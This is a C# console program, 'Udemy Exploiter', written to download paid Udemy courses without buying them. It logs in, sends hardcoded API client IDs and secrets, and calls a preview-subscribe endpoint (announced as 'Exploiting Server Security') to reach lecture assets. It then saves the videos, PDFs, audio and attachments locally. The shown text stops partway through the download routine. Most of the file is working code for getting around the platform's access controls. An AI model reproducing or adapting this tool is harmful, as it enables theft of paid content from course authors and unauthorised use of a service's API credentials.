##########################################################
Author : Etizaz Mohsin
Date : 24 September 2014
P.S : Tool for downloading premium udemy courses    
##########################################################


using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Text.RegularExpressions;
using Newtonsoft.Json;
using System.IO;
using Newtonsoft.Json.Linq;
using System.Threading;


namespace UdemyExploiter
{
    class Program
    {
        static string course_id;
        static string course_dtcode;
        static string courseURL;
        static int download_counter = 0;
        static WebClient x;
        static CookieCollection cookiecol = new CookieCollection();
        static CookieCollection subscribedcol;
        static List<string> lecture_id;
        static List<string> chapter_title;
        static List<string> chapter_index;
        static List<string> lecture_chapterIndex;
        static List<string> lecture_source;
        static List<string> lecture_titles;
        static List<string> lecture_downloadUrls;
        static List<string> lecture_type;
        static List<string> temp_type;
        static List<string> temp_title;
        static List<bool> streamUrl;
        static List<string> dataName;
        static bool extraExists;
        static List<string> extras_downloadUrls;
        static List<string> extras_names;
        static List<string> extras_datanames;
        static List<bool> is_html;
        static List<string> extras_type;
        static List<string> extra_lectureid;
        static TextWriter viewHtml;
        static WebClient myclient;
        static Uri url;
        static dynamic dynJson;
        static string courseName;
        static List<string> course_URLS = new List<string>();
        static int numberofCourses = 0;
        static int y = 0;
        static string access_token;
        static TextWriter mywriter = new StreamWriter("log.txt");

        static void Main(string[] args)
        {
            try
            {
                Console.Clear();
                try
                {
                    login();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message + "\n");
                    Console.ReadKey();
                }
                stuff();
                get_courseURL();


            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Thread.Sleep(3000);
                Console.Clear();
                logo();
                getcourseCodes();
            }


            Console.Clear();
            Console.Write("[+]Downloading successful\n");
            Console.ReadKey();
        }

        static void logo()
        {
            Console.Title = "Udemy Exploiter";
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\t\t      ---------------------------------");
            Console.WriteLine("\t\t         --==[[ Udemy Exploiter ]]==--\n");
            Console.WriteLine("\t\t\t        Coded By : SOG");
            Console.Write("\t\t      ---------------------------------\n\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\t      --==[[ Extracts Premium Courses Download Links ]]==--\n");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.ResetColor();

        }

        static void stuff()
        {
            course_id = "";
            course_dtcode = "";
            courseURL = "";
            download_counter = 0;
            x = new WebClient();
            lecture_id = new List<string>();
            chapter_title = new List<string>();
            chapter_index = new List<string>();
            lecture_chapterIndex = new List<string>();
            lecture_source = new List<string>();
            lecture_titles = new List<string>();
            lecture_downloadUrls = new List<string>();
            lecture_type = new List<string>();
            temp_type = new List<string>();
            temp_title = new List<string>();
            streamUrl = new List<bool>();
            dataName = new List<string>();
            extraExists = false;
            extras_downloadUrls = new List<string>();
            extras_names = new List<string>();
            extras_datanames = new List<string>();
            is_html = new List<bool>();
            extras_type = new List<string>();
            extra_lectureid = new List<string>();
            myclient = new WebClient();
            courseName = "";
            subscribedcol = new CookieCollection();
        }

        static void get_courseURL()
        {

            logo();
            char choice = 'x';
            int num = 0;
            int i = 0;



            Console.Write("\n\t[+]How many courses You want to Add : ");
            num = Convert.ToInt32(Console.ReadLine());

            numberofCourses += num;

            while (i != num)
            {
                Console.Write("\n\t[+]Enter Course " + (i + 1) + " Url : ");
                courseURL = Console.ReadLine();

                course_URLS.Add(courseURL);
                i++;





            }

            Console.Write("\n\t[+]Want to Add more courses (y/n) : ");
            choice = Convert.ToChar(Console.ReadLine());

            if (choice == 'y')
            {
                Console.Clear();
                get_courseURL();
            }
            else if (choice == 'n')
            {
                getcourseCodes();
            }

        }

        static void getcourseCodes()
        {
            for (y = 0; y < course_URLS.Count; y++)
            {
                try
                {
                    courseURL = course_URLS[y];

                    ///////////////////////////////////////////////////////////////////////////////

                    HttpWebRequest getsource = (HttpWebRequest)WebRequest.Create(courseURL);
                    getsource.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2";


                    HttpWebResponse getsourceresponse = (HttpWebResponse)getsource.GetResponse();
                    Stream stream3 = getsourceresponse.GetResponseStream();
                    StreamReader readit3 = new StreamReader(stream3);
                    string completed = readit3.ReadToEnd();
                    getsourceresponse.Close();


                    string patternofcourseLink = @"preview-subscribe/(.*?)" + '"';
                    string preview_link = "";

                    MatchCollection matchesofcourse = Regex.Matches(completed, patternofcourseLink);
                    List<string> prev_sub = new List<string>();
                    foreach (Match match in matchesofcourse)
                    {
                        prev_sub.Add(match.Groups[1].Value);
                    }

                    for (int i = 0; i < prev_sub.Count; i++)
                    {
                        preview_link = prev_sub[i];
                    }

                     

                    //////////////////////////////////////////////////////////////////////////////

                    //int location = preview_link.IndexOf("dtcode=") + 7;

                    //string patternofID = @"courseId=(.*?)";

                    //MatchCollection matchesofcourseID = Regex.Matches(preview_link, patternofID);
                    //List<string> listofcourseID = new List<string>();
                    //foreach (Match match in matchesofcourseID)
                    //{
                    //    listofcourseID.Add(match.Groups[1].Value);
                    //}

                    //for (int i = 0; i < listofcourseID.Count; i++)
                    //{
                    //    course_id = listofcourseID[i];
                    //}

                    int location = preview_link.IndexOf("courseId=") + 9;
                    course_id = preview_link.Substring(location);
 

                    //    course_dtcode = preview_link.Substring(location);

                    courseinfo();
                    stuff();
                }
                catch (Exception e)
                {
                    mywriter.WriteLine("[" + y + ". " + courseName + "] . " + e.Message + "\n\n");
                    stuff();
                    Console.Clear();
                    mywriter.WriteLine("Waiting for 1 Hour\n");
                    Thread.Sleep(3600000);
                    Console.Clear();
                    continue;
                }

            }
            mywriter.Close();
        }

        static void login()
        {
            logo();
            Console.WriteLine("\t[+]Connecting to the Server !");
            string csrf = "";

            Uri url = new Uri("https://www.udemy.com/join/login-popup/");
            HttpWebRequest myrequest = (HttpWebRequest)WebRequest.Create(url);
            myrequest.CookieContainer = new CookieContainer();
            myrequest.CookieContainer.Add(cookiecol);

            HttpWebResponse response = (HttpWebResponse)myrequest.GetResponse();
            Stream stream = response.GetResponseStream();
            StreamReader readit = new StreamReader(stream);
            string source = readit.ReadToEnd();
            cookiecol = response.Cookies;
            response.Close();



            string pattern = @"name='csrfmiddlewaretoken' value='(.*?)'";

            MatchCollection matches = Regex.Matches(source, pattern);
            List<string> l = new List<string>();
            foreach (Match match in matches)
            {
                l.Add(match.Groups[1].Value);

            }

            for (int i = 0; i < l.Count; i++)
            {
                csrf = l[i];
            }



            string email = "fsdf@fsdf.com";
            string password = "asdasd";
            string postdata = "csrfmiddlewaretoken=" + csrf + "&locale=en_US&email=" + email + "&password=" + password;

            

            HttpWebRequest getRequest = (HttpWebRequest)WebRequest.Create("https://www.udemy.com/join/login-popup/");
            getRequest.CookieContainer = new CookieContainer();
            getRequest.CookieContainer.Add(cookiecol); //recover cookies First request
            getRequest.Method = WebRequestMethods.Http.Post;
            getRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2";
            // getRequest.AllowWriteStreamBuffering = true;
            getRequest.AllowAutoRedirect = false;
            getRequest.Referer = "https://www.udemy.com/join/login-popup/";
            getRequest.ContentType = "application/x-www-form-urlencoded";

            byte[] byteArray = Encoding.ASCII.GetBytes(postdata);
            getRequest.ContentLength = byteArray.Length;
            Stream newStream = getRequest.GetRequestStream();
            newStream.Write(byteArray, 0, byteArray.Length);
            newStream.Close();

            HttpWebResponse getResponse = (HttpWebResponse)getRequest.GetResponse();
            Stream stream2 = getResponse.GetResponseStream();
            StreamReader readit2 = new StreamReader(stream2);
            string saveit = readit2.ReadToEnd();
            cookiecol = getResponse.Cookies;
            getResponse.Close();

            foreach(Cookie cookie in cookiecol) {
                if (cookie.Name.Equals("access_token"))
                {
                     
                    access_token = cookie.Value;
                }
            }
             
            Console.WriteLine("\t[+]Connection Established !");
            Console.Clear();

        }
        static void courseinfo()
        {
            // char choice;

            HttpWebRequest myrequest = (HttpWebRequest)WebRequest.Create("https://www.udemy.com/api-1.1/courses/" + course_id);
            WebHeaderCollection myWebHeaderCollection = myrequest.Headers;
            myWebHeaderCollection.Add("X-Udemy-Client-Id: 23409a8b4b499847408f08a61c417378");
            myWebHeaderCollection.Add("X-Udemy-Client-Secret: 94685af4a4e7962abcc657084d73f293647e28fe");
            HttpWebResponse myresponse = (HttpWebResponse)myrequest.GetResponse();
            Stream mystream = myresponse.GetResponseStream();
            StreamReader myreader = new StreamReader(mystream);
            string coursediscription = myreader.ReadToEnd();
            myresponse.Close();


            JObject o = JObject.Parse(coursediscription);

            courseName = o["title"].ToString();
            //    Console.WriteLine("\n\tCourse Title : " + o["title"]);
            //    Console.WriteLine("\tNumber of Lecture : " + o["numLectures"]);
            //    Console.WriteLine("\tPrice : " + o["originalPriceText"]);

            //    Console.Write("\n\tOwn it (y/n) : ");
            //    choice = Convert.ToChar(Console.ReadLine());

            //    if (choice == 'y')
            //    {
            ownit();
            //    }
            //    else
            //    {
            //        Console.Clear();
            //        logo();
            //        getcourseCodes();
            //    }

        }

        static void ownit()
        {
            Console.Clear();
            logo();
            get_lecture_ids();
            // login();
            subscribe();
            getlectureSource();
            extract_download_links();
        }

        static void get_lecture_ids()
        {
            Console.WriteLine("\n\n\t[+]Obtaining Lecture Info");
            x.Headers.Add("X-Udemy-Client-Id: 23409a8b4b499847408f08a61c417378");
            x.Headers.Add("X-Udemy-Client-Secret: 94685af4a4e7962abcc657084d73f293647e28fe");
            //x.Headers.Add("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2");
            string source = x.DownloadString("https://www.udemy.com/api-1.1/courses/" + course_id + "/curriculum?fields[course]=@min,title");


            dynamic dynJson = JsonConvert.DeserializeObject(source);

            foreach (var item in dynJson)
            {
                if (item["__class"].ToString() == "chapter")
                {
                    string id = item.index;
                    chapter_index.Add(id);
                    string title = item.title;

                    string invalidChars2 = Regex.Escape(new string(System.IO.Path.GetInvalidFileNameChars()));
                    string invalidRegStr2 = string.Format(@"([{0}]*\.+$)|([{0}]+)", invalidChars2);

                    string correctformate2 = Regex.Replace(title, invalidRegStr2, "");

                    chapter_title.Add("Section " + id + " " + correctformate2);
                }

            }

            foreach (var item in dynJson)
            {
                if (item["__class"].ToString() == "lecture")
                {
                    string id = item.id;
                    lecture_id.Add(id);
                }

            }


        }

        static void subscribe()
        {

            Console.WriteLine("\t[+]Exploiting Server Security");
            Uri url = new Uri("https://www.udemy.com/course/preview-subscribe/?courseId=" + course_id);
            HttpWebRequest previewreq = (HttpWebRequest)WebRequest.Create(url);
            previewreq.CookieContainer = new CookieContainer();
            previewreq.CookieContainer.Add(cookiecol);
            previewreq.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2";
            previewreq.AllowAutoRedirect = true;

            HttpWebResponse previewresponse = (HttpWebResponse)previewreq.GetResponse();
            Stream stream4 = previewresponse.GetResponseStream();
            StreamReader readit4 = new StreamReader(stream4);
            string idk = readit4.ReadToEnd();
            subscribedcol = previewresponse.Cookies;
            previewresponse.Close();
        }

        static void getlectureSource()
        {
            try
            {

                Console.WriteLine("\t[+]Obtaining Lectures Source");
                for (int i = 0; i < lecture_id.Count; i++)
                {
                    HttpWebRequest lecturesrequest = (HttpWebRequest)WebRequest.Create("https://www.udemy.com/api-1.1/lectures/" + lecture_id[i]);
                    lecturesrequest.CookieContainer = new CookieContainer();
                    lecturesrequest.CookieContainer.Add(subscribedcol);
                    WebHeaderCollection myWebHeaderCollection = lecturesrequest.Headers;
                    myWebHeaderCollection.Add("X-Udemy-Client-Id: bd2565cb7b0c313f5e9bae44961e8db2");
                    myWebHeaderCollection.Add("X-Udemy-Bearer-Token: " + access_token);

                    lecturesrequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2";
                    // completeit.AllowAutoRedirect = true;

                    HttpWebResponse lectureresponse = (HttpWebResponse)lecturesrequest.GetResponse();
                    Stream stream5 = lectureresponse.GetResponseStream();
                    StreamReader readit5 = new StreamReader(stream5);
                    string lecsource = readit5.ReadToEnd();
                    lectureresponse.Close();
                    lecture_source.Add(lecsource);


                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.ReadKey();
            }

        }

        static void extract_download_links()
        {

            string link;

            Console.WriteLine("\t[+]Extracting Download Links !");
            for (int i = 0; i < lecture_source.Count; i++)
            {

                string temp = lecture_source[i];


                JObject o = JObject.Parse(temp);

                temp_type.Add(o["asset"]["type"].ToString());


                if (temp_type[i] == "Video" || temp_type[i] == "E-Book" || temp_type[i] == "Presentation")
                {
                    try
                    {

                        string invalidChars1 = Regex.Escape(new string(System.IO.Path.GetInvalidFileNameChars()));
                        string invalidRegStr1 = string.Format(@"([{0}]*\.+$)|([{0}]+)", invalidChars1);

                        string correctformate1 = Regex.Replace(o["title"].ToString(), invalidRegStr1, "");

                        if (temp_type[i] == "Presentation")
                        {
                            correctformate1 = "(Slide)." + correctformate1;
                        }


                        lecture_titles.Add(correctformate1);

                        lecture_type.Add(o["asset"]["type"].ToString());

                        lecture_chapterIndex.Add(o["chapterIndex"].ToString());


                        dataName.Add(o["asset"]["data"]["name"].ToString().Trim());

                        //Console.WriteLine(lecture_titles[i] + "\n");

                        link = o["asset"]["downloadUrl"]["download"].ToString();

                        //Console.WriteLine(link + "\n");
                        //Console.ReadKey();

                        lecture_downloadUrls.Add(link);

                        streamUrl.Add(false);


                    }
                    catch (Exception e)
                    {
                        //Console.WriteLine(lecture_titles[i] + "\n");

                        link = o["asset"]["viewHTML"].ToString();
                        link = link.Trim();

                        //Console.WriteLine(link + "\n");
                        //Console.ReadKey();


                        streamUrl.Add(true);
                        dataName.Add("NULL");
                        lecture_downloadUrls.Add(link);
                        continue;

                    }

                }

                else if (temp_type[i] == "File")
                {
                    link = o["asset"]["downloadUrl"]["File"].ToString();


                    string invalidChars2 = Regex.Escape(new string(System.IO.Path.GetInvalidFileNameChars()));
                    string invalidRegStr2 = string.Format(@"([{0}]*\.+$)|([{0}]+)", invalidChars2);

                    string correctformate2 = Regex.Replace(o["title"].ToString(), invalidRegStr2, "");

                    lecture_titles.Add(correctformate2);
                    lecture_type.Add(o["asset"]["type"].ToString());
                    lecture_chapterIndex.Add(o["chapterIndex"].ToString());

                    //Console.WriteLine(lecture_titles[i] + "\n");

                    string q = link.Trim();
                    q = q.Remove(0, 5);
                    q = q.Remove(q.Length - 4);
                    q = q.Remove(0, 1);


                    //Console.WriteLine(q + "\n");
                    //Console.ReadKey();


                    dataName.Add(o["asset"]["data"]["name"].ToString().Trim());
                    lecture_downloadUrls.Add(q);
                    streamUrl.Add(false);
                }

                else if (temp_type[i] == "Article")
                {

                    string invalidCharsx = Regex.Escape(new string(System.IO.Path.GetInvalidFileNameChars()));
                    string invalidRegStrx = string.Format(@"([{0}]*\.+$)|([{0}]+)", invalidCharsx);

                    string correctformatex = Regex.Replace(o["title"].ToString(), invalidRegStrx, "");


                    lecture_titles.Add("(Article)." + correctformatex);

                    lecture_type.Add(o["asset"]["type"].ToString());

                    lecture_chapterIndex.Add(o["chapterIndex"].ToString());

                    //Console.WriteLine(lecture_titles[i] + "\n");

                    link = o["asset"]["viewHTML"].ToString();


                    //Console.WriteLine(link + "\n");
                    //Console.ReadKey();

                    dataName.Add("NULL");

                    lecture_downloadUrls.Add(link);
                    streamUrl.Add(false);

                }

                else if (temp_type[i] == "Audio")
                {
                    link = o["asset"]["downloadUrl"]["Audio"].ToString();


                    string invalidCharsy = Regex.Escape(new string(System.IO.Path.GetInvalidFileNameChars()));
                    string invalidRegStry = string.Format(@"([{0}]*\.+$)|([{0}]+)", invalidCharsy);

                    string correctformatey = Regex.Replace(o["title"].ToString(), invalidRegStry, "");

                    lecture_titles.Add(correctformatey);

                    lecture_type.Add(o["asset"]["type"].ToString());

                    lecture_chapterIndex.Add(o["chapterIndex"].ToString());

                    string q = link.Trim();
                    q = q.Remove(0, 5);
                    q = q.Remove(q.Length - 4);
                    q = q.Remove(0, 1);


                    dataName.Add(o["asset"]["data"]["name"].ToString().Trim());

                    lecture_downloadUrls.Add(q);

                    streamUrl.Add(false);
                    //Console.WriteLine(lecture_titles[i] + "" + link + "\n\n");

                }


                string extras = o["extras"].ToString();
                int length = extras.Length;

                if (length > 5)
                {
                    extraExists = true;
                    getExtras(temp, i);
                }

            }

            Console.WriteLine("\t[+]Pwned !");
            Thread.Sleep(300);

            string invalidChars3 = Regex.Escape(new string(System.IO.Path.GetInvalidFileNameChars()));
            string invalidRegStr3 = string.Format(@"([{0}]*\.+$)|([{0}]+)", invalidChars3);

            courseName = Regex.Replace(courseName, invalidRegStr3, "");

            string dirname = @"C:\udemy";

            if (!Directory.Exists(dirname))
            {
                Directory.CreateDirectory(dirname);
            }

            Directory.CreateDirectory(@"c:\udemy\" + courseName);

            for (int i = 0; i < chapter_index.Count; i++)
            {
                Directory.CreateDirectory(@"C:\udemy\" + courseName + @"\" + chapter_title[i]);
            }

            if (extraExists)
            {
                Directory.CreateDirectory(@"C:\udemy\" + courseName + @"\" + "Extras");
            }

            Console.Clear();
            download();

        }

        static void getExtras(string text, int i)
        {
            dynamic dynJson = JsonConvert.DeserializeObject(text);


            foreach (JObject item in dynJson.extras.Children())
            {


                if (item["type"].ToString() == "File")
                {
                    try
                    {

                        string invalidCharsx = Regex.Escape(new string(System.IO.Path.GetInvalidFileNameChars()));
                        string invalidRegStrx = string.Format(@"([{0}]*\.+$)|([{0}]+)", invalidCharsx);

                        string correctformatex = Regex.Replace(item["title"].ToString(), invalidRegStrx, "");

                        string dataname = item["data"]["name"].ToString();
                        string title = correctformatex;
                        string filelink = item["downloadUrl"]["File"].ToString();
                        filelink = filelink.Trim();
                        filelink = filelink.Remove(0, 5);
                        filelink = filelink.Remove(filelink.Length - 4);
                        filelink = filelink.Remove(0, 1);
                        string type = item["type"].ToString();
                        string id = (i + 1).ToString();


                        extra_lectureid.Add(id);
                        extras_type.Add(type);
                        extras_names.Add(title);
                        extras_downloadUrls.Add(filelink);
                        is_html.Add(false);
                        extras_datanames.Add(dataname);
                    }
                    catch (Exception e)
                    {
                        string invalidCharsx = Regex.Escape(new string(System.IO.Path.GetInvalidFileNameChars()));
                        string invalidRegStrx = string.Format(@"([{0}]*\.+$)|([{0}]+)", invalidCharsx);

                        string correctformatex = Regex.Replace(item["title"].ToString(), invalidRegStrx, "");

                        string dataname = "NULL";
                        string title = correctformatex;
                        string filelink = item["viewHTML"].ToString();
                        string type = item["type"].ToString();
                        string id = (i + 1).ToString();


                        extra_lectureid.Add(id);
                        extras_type.Add(type);
                        extras_names.Add(title);
                        extras_downloadUrls.Add(filelink);
                        is_html.Add(true);
                        extras_datanames.Add(dataname);

                    }
                }
                else if (item["type"].ToString() == "ExternalLink")
                {
                    string invalidCharsy = Regex.Escape(new string(System.IO.Path.GetInvalidFileNameChars()));
                    string invalidRegStry = string.Format(@"([{0}]*\.+$)|([{0}]+)", invalidCharsy);

                    string correctformatey = Regex.Replace(item["title"].ToString(), invalidRegStry, "");

                    string htmllink = item["viewHTML"].ToString();
                    string title = "(ExternalLink)." + correctformatey;
                    string type = item["type"].ToString();
                    string id = (i + 1).ToString();

                    extra_lectureid.Add(id);
                    extras_type.Add(type);
                    extras_names.Add(title);
                    extras_downloadUrls.Add(htmllink);
                    is_html.Add(true);
                    extras_datanames.Add("NULL");
                }

            }
        }

        static void download()
        {


            for (int i = 0; i < lecture_downloadUrls.Count; i++)
            {
                Console.WriteLine("Course => " + courseName + " " + (y + 1) + " / " + numberofCourses + " <=\n");
                Console.WriteLine(download_counter + " / " + lecture_downloadUrls.Count);

                if (lecture_type[i] != "Article" && streamUrl[i] == false)
                {
                    url = new Uri(lecture_downloadUrls[i]);
                }

                try
                {
                    if (lecture_type[i] == "Video")
                    {

                        if (lecture_chapterIndex[i] != "0")
                        {
                            for (int j = 0; j < chapter_index.Count; j++)
                            {
                                if (lecture_chapterIndex[i] == chapter_index[j])
                                {
                                    if (streamUrl[i] == false)
                                    {
                                        myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".mp4");

                                    }
                                    else if (streamUrl[i] == true)
                                    {
                                        viewHtml = new StreamWriter("c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".html");

                                        viewHtml.WriteLine(lecture_downloadUrls[i]);
                                        viewHtml.Close();
                                    }

                                }
                            }
                        }
                        else if (lecture_chapterIndex[i] == "0")
                        {
                            if (streamUrl[i] == false)
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".mp4");
                            }
                            else if (streamUrl[i] == true)
                            {
                                viewHtml = new StreamWriter("c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".html");

                                viewHtml.WriteLine(lecture_downloadUrls[i]);
                                viewHtml.Close();
                            }
                        }
                    }


                    else if (lecture_type[i] == "Presentation")
                    {

                        if (lecture_chapterIndex[i] != "0")
                        {
                            for (int j = 0; j < chapter_index.Count; j++)
                            {
                                if (lecture_chapterIndex[i] == chapter_index[j])
                                {
                                    myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".pdf");
                                }
                            }
                        }
                        else if (lecture_chapterIndex[i] == "0")
                        {
                            myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".pdf");
                        }


                    }

                    else if (lecture_type[i] == "Audio")
                    {

                        if (lecture_chapterIndex[i] != "0")
                        {
                            for (int j = 0; j < chapter_index.Count; j++)
                            {
                                if (lecture_chapterIndex[i] == chapter_index[j])
                                {
                                    myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".mp3");
                                }
                            }
                        }
                        else if (lecture_chapterIndex[i] == "0")
                        {
                            myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".mp3");
                        }


                    }

                    else if (lecture_type[i] == "Article")
                    {

                        if (lecture_chapterIndex[i] != "0")
                        {
                            for (int j = 0; j < chapter_index.Count; j++)
                            {
                                if (lecture_chapterIndex[i] == chapter_index[j])
                                {
                                    viewHtml = new StreamWriter("c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".html");

                                    viewHtml.WriteLine(lecture_downloadUrls[i]);
                                    viewHtml.Close();
                                }
                            }
                        }
                        else if (lecture_chapterIndex[i] == "0")
                        {
                            viewHtml = new StreamWriter("c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".html");

                            viewHtml.WriteLine(lecture_downloadUrls[i]);
                            viewHtml.Close();
                        }


                    }

                    else if (lecture_type[i] == "E-Book")
                    {
                        if (lecture_chapterIndex[i] != "0")
                        {
                            for (int j = 0; j < chapter_index.Count; j++)
                            {
                                if (lecture_chapterIndex[i] == chapter_index[j])
                                {
                                    myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".pdf");
                                }
                            }
                        }
                        else if (lecture_chapterIndex[i] == "0")
                        {
                            myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".pdf");
                        }
                    }


                    else if (lecture_type[i] == "File")
                    {
                        if (url.ToString().IndexOf(".pdf") != -1)
                        {
                            if (lecture_chapterIndex[i] != "0")
                            {
                                for (int j = 0; j < chapter_index.Count; j++)
                                {
                                    if (lecture_chapterIndex[i] == chapter_index[j])
                                    {
                                        myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".pdf");
                                    }
                                }
                            }
                            else if (lecture_chapterIndex[i] == "0")
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".pdf");
                            }

                        }
                        else if (url.ToString().IndexOf(".zip") != -1)
                        {
                            if (lecture_chapterIndex[i] != "0")
                            {
                                for (int j = 0; j < chapter_index.Count; j++)
                                {
                                    if (lecture_chapterIndex[i] == chapter_index[j])
                                    {
                                        myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".zip");
                                    }
                                }
                            }
                            else if (lecture_chapterIndex[i] == "0")
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".zip");
                            }

                        }
                        else if (url.ToString().IndexOf(".txt") != -1)
                        {

                            if (lecture_chapterIndex[i] != "0")
                            {
                                for (int j = 0; j < chapter_index.Count; j++)
                                {
                                    if (lecture_chapterIndex[i] == chapter_index[j])
                                    {
                                        myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".txt");
                                    }
                                }
                            }
                            else if (lecture_chapterIndex[i] == "0")
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".txt");
                            }
                        }
                        else if (url.ToString().IndexOf(".rar") != -1)
                        {

                            if (lecture_chapterIndex[i] != "0")
                            {
                                for (int j = 0; j < chapter_index.Count; j++)
                                {
                                    if (lecture_chapterIndex[i] == chapter_index[j])
                                    {
                                        myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".rar");
                                    }
                                }
                            }
                            else if (lecture_chapterIndex[i] == "0")
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".rar");
                            }
                        }
                        else if (url.ToString().IndexOf(".doc") != -1)
                        {
                            if (lecture_chapterIndex[i] != "0")
                            {
                                for (int j = 0; j < chapter_index.Count; j++)
                                {
                                    if (lecture_chapterIndex[i] == chapter_index[j])
                                    {
                                        myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".doc");
                                    }
                                }
                            }
                            else if (lecture_chapterIndex[i] == "0")
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".doc");
                            }

                        }
                        else if (url.ToString().IndexOf(".docx") != -1)
                        {
                            if (lecture_chapterIndex[i] != "0")
                            {
                                for (int j = 0; j < chapter_index.Count; j++)
                                {
                                    if (lecture_chapterIndex[i] == chapter_index[j])
                                    {
                                        myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".docx");
                                    }
                                }
                            }
                            else if (lecture_chapterIndex[i] == "0")
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".docx");
                            }

                        }
                        else if (url.ToString().IndexOf(".ppt") != -1)
                        {
                            if (lecture_chapterIndex[i] != "0")
                            {
                                for (int j = 0; j < chapter_index.Count; j++)
                                {
                                    if (lecture_chapterIndex[i] == chapter_index[j])
                                    {
                                        myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".ppt");
                                    }
                                }
                            }
                            else if (lecture_chapterIndex[i] == "0")
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".ppt");
                            }
                        }
                        else if (url.ToString().IndexOf(".pptx") != -1)
                        {
                            if (lecture_chapterIndex[i] != "0")
                            {
                                for (int j = 0; j < chapter_index.Count; j++)
                                {
                                    if (lecture_chapterIndex[i] == chapter_index[j])
                                    {
                                        myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".pptx");
                                    }
                                }
                            }
                            else if (lecture_chapterIndex[i] == "0")
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + lecture_titles[i] + ".pptx");
                            }
                        }

                        else if (url.ToString().IndexOf(".pdf") == -1 && url.ToString().IndexOf(".zip") == -1 && url.ToString().IndexOf(".txt") == -1 && url.ToString().IndexOf(".rar") == -1 && url.ToString().IndexOf(".doc") == -1 && url.ToString().IndexOf(".docx") == -1 && url.ToString().IndexOf(".ppt") == -1 && url.ToString().IndexOf(".pptx") == -1)
                        {
                            if (lecture_chapterIndex[i] != "0")
                            {
                                for (int j = 0; j < chapter_index.Count; j++)
                                {
                                    if (lecture_chapterIndex[i] == chapter_index[j])
                                    {
                                        myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + chapter_title[j] + @"\" + (i + 1).ToString() + "." + dataName[i]);
                                    }
                                }
                            }
                            else if (lecture_chapterIndex[i] == "0")
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + (i + 1).ToString() + "." + dataName[i]);
                            }
